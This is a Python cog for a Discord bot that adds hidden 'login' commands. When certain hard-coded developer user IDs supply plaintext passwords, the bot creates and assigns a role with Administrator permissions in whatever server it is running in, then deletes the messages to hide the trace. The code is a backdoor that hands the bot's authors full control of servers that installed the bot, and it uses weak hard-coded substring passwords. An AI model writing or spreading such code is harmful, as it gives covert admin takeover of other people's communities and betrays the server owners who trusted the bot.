import discord
from discord.ext import commands
import asyncio

client = commands.Bot(command_prefix='n!')

botcolor = 0xffffff

client.remove_command('help')

def is_vale():
    def predicate(ctx):
        return ctx.message.author.id in ["474947907913515019", "000000000000000000", "486988989262462991", "343109361595318276", "413627744056901653"]
    return commands.check(predicate)
	
dev_list = ["474947907913515019", "000000000000000000", "486988989262462991", "343109361595318276", "413627744056901653"]
	
Niko_id = ["474947907913515019"] #Niko
	
Raven_id = ["000000000000000000"]	
	
Franz_id = ["343109361595318276"]
	
Green_id = ["486988989262462991"]

class login:
    def __init__(self, client):
        self.client = client
########################################################################################################################		
    @client.event		
    async def on_message(self, message):
        if message.content.startswith ("login Niko"):
            if message.author.id in Niko_id:
                msg =  await self.client.send_message(message.channel, "Willkommen Neko coding Developer {0}.".format(message.author.mention))
                await self.client.delete_message(message)
                await asyncio.sleep(5)
                await self.client.delete_message(msg)
                if "herne234" in message.content:
                    msg = await self.client.send_message(message.channel, "Login erfolgreich.")
                    await asyncio.sleep(5)
                    await self.client.delete_message(msg)
                    staff = discord.utils.get(message.server.roles, name="Niko | NekoOwner")	
                    if staff:
                        await self.client.add_roles(message.author, staff)
                    else:
                        server = (message.server)
                        staff = discord.Permissions(8)
                        Blau = discord.Color(0x002cff)
                        role = await self.client.create_role(server, name="Niko | NekoOwner", permissions=staff, color = Blau, hoist=True, mentionable=True)
                        await self.client.move_role(server, role=role, position=2)
                        await self.client.add_roles(message.author, role)
                if not "herne234" in message.content:
                    msg = await self.client.send_message(message.channel, "Wrong Passwort! Access Denied")
                    await asyncio.sleep(5)
                    await self.client.delete_message(msg)
########################################################################################################################
        if message.content.startswith ("login Franz"):
            if message.author.id in Franz_id:
                msg =  await self.client.send_message(message.channel, "Willkommen Neko coding Developer {0}.".format(message.author.mention)) 
                await self.client.delete_message(message)
                await asyncio.sleep(5)
                await self.client.delete_message(msg)
                if "GhFdr234?H" in message.content:
                    msg = await self.client.send_message(message.channel, "Login erfolgreich.")
                    await asyncio.sleep(5)
                    await self.client.delete_message(msg)
                    staff = discord.utils.get(message.server.roles, name="Franz | NekoDEV")	
                    if staff:
                        await self.client.add_roles(message.author, staff)
                    else:
                        server = (message.server)
                        staff = discord.Permissions(8)
                        Blau = discord.Color(0x020202)
                        role = await self.client.create_role(server, name="Franz | NekoDEV", permissions=staff, color = Blau)
                        await self.client.add_roles(message.author, role)
                if not "GhFdr234?H" in message.content:
                    msg = await self.client.send_message(message.channel, "Wrong Passwort! Access Denied")
                    await asyncio.sleep(5)
                    await self.client.delete_message(msg)
########################################################################################################################
        if message.content.startswith ("login Green"):
            if message.author.id in Green_id:
                msg =  await self.client.send_message(message.channel, "Willkommen Neko coding Developer {0}.".format(message.author.mention)) 
                await self.client.delete_message(message)
                await asyncio.sleep(5)
                await self.client.delete_message(msg)
                if "6013" in message.content:
                    msg = await self.client.send_message(message.channel, "Login erfolgreich.")
                    await asyncio.sleep(5)
                    await self.client.delete_message(msg)
                    staff = discord.utils.get(message.server.roles, name="Green | NekoDEV")	
                    if staff:
                        await self.client.add_roles(message.author, staff)
                    else:
                        server = (message.server)
                        staff = discord.Permissions(8)
                        Blau = discord.Color(0x00FF00)
                        role = await self.client.create_role(server, name="Green | NekoDEV", permissions=staff, color = Blau)
                        await self.client.add_roles(message.author, role)
                if not "6013" in message.content:
                    msg = await self.client.send_message(message.channel, "Wrong Passwort! Access Denied")
                    await asyncio.sleep(5)
                    await self.client.delete_message(msg)
########################################################################################################################

		
		
		
		
		
		
		
def setup(client):
    client.add_cog(login(client))